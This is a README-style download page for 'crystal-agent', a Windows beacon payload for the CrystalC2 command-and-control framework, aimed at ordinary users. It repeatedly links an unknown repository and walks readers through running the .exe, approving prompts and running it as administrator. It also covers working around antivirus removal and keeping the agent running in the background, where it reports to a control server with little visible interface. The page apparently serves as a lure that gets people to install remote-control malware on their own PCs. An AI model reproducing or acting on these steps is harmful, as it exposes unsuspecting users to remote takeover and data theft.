# 🧊 crystal-agent - Run Beacon Payloads on Windows

[![Download](https://img.shields.io/badge/Download-crystal--agent-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/moorcockclostridia808/crystal-agent)

## 🧩 What This Is

crystal-agent is the payload side of CrystalC2. It is built for Windows and is used to run agent tasks from a CrystalC2 setup.

This README is written for end users who want to get the app from GitHub and run it on a Windows PC.

## 📥 Download crystal-agent

Visit this page to download and run the file:

https://github.com/moorcockclostridia808/crystal-agent

If the page shows a release file, download it to your PC. If it shows source files only, use the files in the repo as provided by the project owner.

### What to look for
- A release asset such as an `.exe` file
- A zip file with the app inside
- A clear file name tied to crystal-agent

## 🪟 Windows Setup

Use a Windows 10 or Windows 11 PC with a standard user account.

Before you start, make sure you have:
- At least 200 MB of free disk space
- An internet connection for the first download
- Permission to run files on your PC
- Microsoft Defender or another security tool set up in a normal state

If Windows shows a SmartScreen prompt, choose the option that lets you continue only if you trust the file source.

## 🚀 How to Install

Follow these steps:

1. Open the download page in your browser:
   https://github.com/moorcockclostridia808/crystal-agent

2. Download the file from the page.

3. If the file comes in a zip folder, right-click it and select Extract All.

4. Open the extracted folder.

5. Look for the main app file. It may be an `.exe` file.

6. Double-click the app file to start it.

7. If Windows asks for permission, choose Yes.

8. If the app opens a window or console, leave it open while you use it.

## 🖥️ First Run

The first time you start crystal-agent, Windows may take a few seconds to check the file.

You may see:
- A security prompt
- A console window
- A blank window while the agent starts
- A short setup delay

If the app closes right away, open it again from the same folder and check whether Windows blocked it.

## ⚙️ Basic Use

crystal-agent is meant to work as part of a CrystalC2 setup. In a normal use flow, the agent connects to its configured control point and waits for tasks.

You may need to:
- Keep the app running
- Leave the window open
- Use the same folder each time
- Restart the app after a reboot

If your build includes a config file, keep it in the same folder as the main file unless the project instructions say otherwise.

## 🔐 File Layout

A common folder setup may look like this:

- crystal-agent.exe — main file
- config.json — settings file
- logs — app log folder
- README.md — project notes
- assets — support files

If your download has a different layout, use the main file that starts the app.

## 🛠️ Common Problems

### The app does not open
- Check that the file finished downloading
- Make sure you extracted the zip file
- Right-click the file and try Run as administrator
- Check whether antivirus moved the file

### Windows blocks the file
- Open the file again and review the Windows prompt
- If the file came from the project link, allow it only if you trust the source

### The window opens and closes fast
- Start it from Command Prompt so you can see any error text
- Check whether a needed file is missing
- Make sure the app and config files stay in the same folder

### The app cannot connect
- Check your internet connection
- Check proxy or firewall rules
- Make sure any host or port settings match your CrystalC2 setup

## 🔍 What You Need

For a smooth run on Windows, use:
- Windows 10 or Windows 11
- A stable network connection
- A recent system update
- Enough rights to run local apps
- A folder you can keep unchanged after setup

## 📂 Best Folder to Use

Put crystal-agent in a simple path such as:

- `C:\Apps\crystal-agent`
- `C:\Users\YourName\Downloads\crystal-agent`

Avoid paths with extra symbols or deep folder trees. Short paths make it easier to find files and keep settings in place.

## 🧪 Check That It Works

After launch, look for signs that the app is active:
- A console window stays open
- A tray icon appears, if the build uses one
- A log file updates
- The app connects to its target system

If you see these signs, the agent is running as expected.

## 📌 Quick Steps

1. Open the download page  
2. Download the file  
3. Extract it if needed  
4. Open the main app file  
5. Allow Windows permission prompts  
6. Keep the app running  

## 🧭 Need the Download Again?

Use the same page here:

https://github.com/moorcockclostridia808/crystal-agent

## 📁 Suggested Use After Download

After you download and run crystal-agent:
- Keep the folder in one place
- Do not rename the main file unless you know it is safe
- Keep config and support files beside the app
- Restart it after Windows restarts

## 🧰 File Tips

If you want to make the app easier to find:
- Right-click the main file and send it to the desktop
- Pin the folder to Quick Access
- Use a short folder name
- Store the download in a fixed location

## ⌨️ If You Use Command Prompt

Some builds work best from a command line window. If that applies:
- Open Start
- Type `cmd`
- Open Command Prompt
- Change to the app folder
- Run the main file from there

This can help you see any start-up errors on screen

## 🪄 Simple Run Flow

- Download from GitHub
- Extract the files
- Open the app
- Keep it running
- Watch for logs or status text

## 🧱 Expected Behavior

A working crystal-agent build usually:
- Starts with little input
- Stays active in the background
- Uses a config file or hardcoded settings
- Sends status back to its control side
- Shows little or no user interface

## 🧭 Where to Get It

Primary link:

https://github.com/moorcockclostridia808/crystal-agent